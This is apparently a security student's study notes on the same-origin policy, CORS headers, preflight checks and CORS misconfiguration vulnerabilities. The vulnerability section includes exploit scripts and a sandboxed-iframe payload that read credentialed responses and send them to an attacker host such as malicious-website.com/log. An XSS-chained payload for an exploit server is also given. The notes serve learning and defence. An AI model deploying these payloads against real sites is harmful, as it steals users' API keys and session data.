# Same-Origin Policy
The same-origin policy is a web browser security mechanism that aims to prevent websites from attacking each other. It restricts scripts on one origin from accessing data from another origin.

- This doesn't prevent *writing* b/w web applications, it prevents *reading* b/w web applications.
- Access is determined based on **origin**.

##### What is an Origin?
Origin is defined by :-
- Scheme (Protocol)
- Host (Domain)
- Port no

![[Pasted image 20231015150535.png]]

![[Pasted image 20231015150700.png]]

---
# Cross-Origin Resource Sharing
CORS is a mechanism that uses **HTTP headers** to define origins that the browser permit loading resources.

It makes use of 2 **HTTP Headers** :-
- Access-Control-Allow-Origin
- Access-Control-Allow-Credentials

###### CORS Configuration
In Spring Framework :-
![[Pasted image 20231015151726.png]]


## Access-Control-Allow-Origin Header
This *response header* indicates whether the response can be shared with requesting code from the given origin.
For example, suppose a website with origin `normal-website.com` causes the following cross-domain request:
```http
GET /data HTTP/1.1
Host: robust-website.com
Origin : https://normal-website.com
```

The server on `robust-website.com` returns the following response:
```http
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://normal-website.com
```
The browser will allow code running on `normal-website.com` to access the response because the origins match.

```http
# Syntax
Access-Control-Allow-Origin: *
Access-Control-Allow-Origin: <origin (Multiple domains not allowed)>
Access-Control-Allow-Origin: null
```

```http
# This is not allowed
Access-Control-Allow-Origin: https://*.normal-website.com
```

## Access-Control-Allow-Credentials Header
The default behavior of cross-origin resource requests is for *requests to be passed without credentials like cookies and the Authorization header*. However, the cross-domain server can permit reading of the response when credentials are passed to it by setting the CORS Access-Control-Allow-Credentials header to true. Now if the requesting website uses JavaScript to declare that it is sending cookies with the request:

```http
GET /data HTTP/1.1
Host: robust-website.com
...
Origin: https://normal-website.com
Cookie: JSESSIONID=<value>
```

And the response to the request is:
```http
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://normal-website.com
Access-Control-Allow-Credentials: true
```
Then the browser will permit the requesting website to read the response, because the Access-Control-Allow-Credentials response header is set to `true`. Otherwise, the browser will not allow access to the response.


###### Note
```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```
This is not permitted as this would be dangerously insecure, exposing any authenticated content on the target site to everyone.


## Pre-Flight checks
Under certain circumstances, when a cross-domain request includes a *non-standard HTTP method* or headers, the cross-origin request is preceded by a request using the `OPTIONS` method, and the CORS protocol necessitates an *initial check on what methods and headers are permitted* prior to allowing the cross-origin request. This is called the pre-flight check.

For example, this is a pre-flight request that is seeking to use the PUT method together with a custom request header called Special-Request-Header:

```http
OPTIONS /data HTTP/1.1
Host: <some website>
...
Origin: https://normal-website.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Special-Request-Header
```

The server might return a response like the following:
```http
HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://normal-website.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Special-Request-Header
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```
This response sets out the allowed methods (PUT, POST and OPTIONS) and permitted request headers (Special-Request-Header). In this particular case the cross-domain server also allows the sending of credentials, and the Access-Control-Max-Age header defines a maximum timeframe for caching the pre-flight response for reuse. Pre-flight checks add an extra HTTP request round-trip to the cross-domain request, so they increase the browsing overhead.

---
# Vulnerabilities

## Server-generated ACAO header from client-specified Origin header
Some applications need to provide access to a number of other domains. Maintaining a list of allowed domains requires ongoing effort, and any mistakes risk breaking functionality. So some applications take the easy route of effectively allowing access from any other domain.

One way to do this is by reading the Origin header from requests and including a response header stating that the requesting origin is allowed. For example, consider an application that receives the following request:

```http
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
```

It then responds with:
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true

{
  "username": "wiener",
  "email": "",
  "apikey": "eDUPMIkr3xCOitbDuIyAQHVkpmkPne6Y",
  "sessions": [
    "yTH23YWRXsZHXv7StpQrrJrGkaBrsUDV"
  ]
}
```
These headers state that access is allowed from the requesting domain (malicious-website.com) and that the cross-origin requests can include cookies (Access-Control-Allow-Credentials: true) and so will be processed in-session.

Because the application reflects arbitrary origins in the Access-Control-Allow-Origin header, this means that absolutely any domain can access resources from the vulnerable domain. If the response contains any sensitive information such as an *API key or CSRF token*, you could retrieve this by placing the following script on your website/exploit server:
```http
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
   location='//malicious-website.com/log?key='+this.responseText;
```
OR
```html
<html>
    <body>
        <h1>Hello World!</h1>
        <script>
            var xhr = new XMLHttpRequest();
            var url = "vulnerable-website.net"
            xhr.onreadystatechange = function() {
                if (xhr.readyState == XMLHttpRequest.DONE){
                    fetch("/log?key=" + xhr.responseText)
                }
            }

            xhr.open('GET', url + "/[directory with CORS]", true);
            xhr.withCredentials = true;
            xhr.send(null)
        </script>
    </body>
</html>
```


## Errors parsing Origin headers
Some applications that support access from multiple origins do so by using a whitelist of allowed origins. When a CORS request is received, the supplied origin is compared to the whitelist. If the origin appears on the whitelist then it is reflected in the Access-Control-Allow-Origin header so that access is granted. For example, the application receives a normal request like:

```http
GET /data HTTP/1.1
Host: normal-website.com
...
Origin: https://innocent-website.com
```
The application checks the supplied origin against its list of allowed origins and, if it is on the list, reflects the origin as follows:

```http
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://innocent-website.com
```
Mistakes often arise when implementing CORS origin whitelists. Some organizations decide to allow access from all their subdomains (including future subdomains not yet in existence). And some applications allow access from various other organizations' domains including their subdomains. These rules are often implemented by matching URL prefixes or suffixes, or using regular expressions. Any mistakes in the implementation can lead to access being granted to unintended external domains.

For example, suppose an application grants access to all *domains ending* in:
`normal-website.com`
An attacker might be able to gain access by registering the domain:
`hackersnormal-website.com`

Alternatively, suppose an application grants access to all *domains beginning* with
`normal-website.com`
An attacker might be able to gain access using the domain:
`normal-website.com.evil-user.net`

## Whitelisted null origin value
The specification for the Origin header supports the value null. Browsers might send the value null in the Origin header in various unusual situations:
- Cross-origin redirects.
- Requests from serialized data.
- Request using the file: protocol.
- Sandboxed cross-origin requests.
Some applications might whitelist the null origin to support local development of the application. For example, suppose an application receives the following cross-origin request:

```http
GET /sensitive-victim-data
Host: vulnerable-website.com
Origin: null
```

And the server responds with:
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true

{
  "username": "wiener",
  "email": "",
  "apikey": "70yQEWLDL4KFLipxEv7qFHlqRcCiK4RN",
  "sessions": [
    "qINofdLi8FW5PiLHWAxIMbsD9PCfmKLq"
  ]
}
```

In this situation, an attacker can use various tricks to generate a cross-origin request containing the value null in the Origin header. This will satisfy the whitelist, leading to cross-domain access. For example, this can be done using a sandboxed `iframe` cross-origin request of the form:
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
```


## Breaking TLS with Poorly Configured CORS
Suppose an application that rigorously employs HTTPS also whitelists a trusted subdomain that is using plain HTTP. For example, when the application receives the following request:

```http
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: http://trusted-subdomain.vulnerable-website.com
Cookie: sessionid=...
```

The application responds with:
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

In this situation, an attacker who is in a position to intercept a victim user's traffic can exploit the CORS configuration to compromise the victim's interaction with the application. This attack involves the following steps:
- The victim user makes any plain HTTP request.
- The attacker injects a redirection to: http://trusted-subdomain.vulnerable-website.com
- The victim's browser follows the redirect.
- The attacker intercepts the plain HTTP request, and returns a spoofed response containing a CORS request to: https://vulnerable-website.com
- The victim's browser makes the CORS request, including the origin: http://trusted-subdomain.vulnerable-website.com
- The application allows the request because this is a whitelisted origin. The requested sensitive data is returned in the response.
- The attacker's spoofed page can read the sensitive data and transmit it to any domain under the attacker's control.

We can use **Man in the Middle Attack** to spoof the user request!

## Using [[XSS]] with CORS
If you find a vulnerable input with [[XSS]], we can leverage that to perform CORS.

Put this in your exploit server:
```http
<html>
    <body>
        <h1>Hello World!</h1>
        <script>
            document.location="http://[XSS vulnerable address]/?[vuln_parameter]=<script>var xhr = new XMLHttpRequest();var url = 'http://vulnerableserver.web-security-academy.net';xhr.onreadystatechange = function(){if (xhr.readyState == XMLHttpRequest.DONE) {fetch('https://[exploit_server_url]/log?key=' %2b xhr.responseText)};};xhr.open('GET', url %2b '/[directory with CORS]', true); xhr.withCredentials = true;xhr.send(null);%3c/script>&storeId=1"
        </script>
    </body>
</html>
```

URL Encode `<` & `+` (Already done above)
